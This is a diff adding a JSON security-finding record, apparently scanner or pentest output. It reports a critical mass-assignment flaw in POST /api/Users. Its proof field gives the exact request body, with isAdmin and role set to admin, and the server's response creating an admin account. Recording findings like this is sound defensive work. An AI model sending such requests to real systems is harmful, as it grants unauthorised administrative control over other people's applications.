@@ -1,0 +1,10 @@
+{
+  "title": "Mass Assignment Privilege Escalation via POST /api/Users",
+  "location": "/api/users",
+  "severity": "critical",
+  "proof": "POST /api/Users with body {\"email\":\"test_mass_assign@test.com\",\"password\":\"test123\",\"isAdmin\":true,\"role\":\"admin\"} returned HTTP 201 with {\"data\":{\"email\":\"test_mass_assign@test.com\",\"role\":\"admin\",\"isActive\":true}}. The user was created with role=admin, granting full administrative privileges.",
+  "stage": "class_probe",
+  "precondition": "Authenticated session (any role)",
+  "affected_actor": "actor_a",
+  "affected_resource": "user"
+}
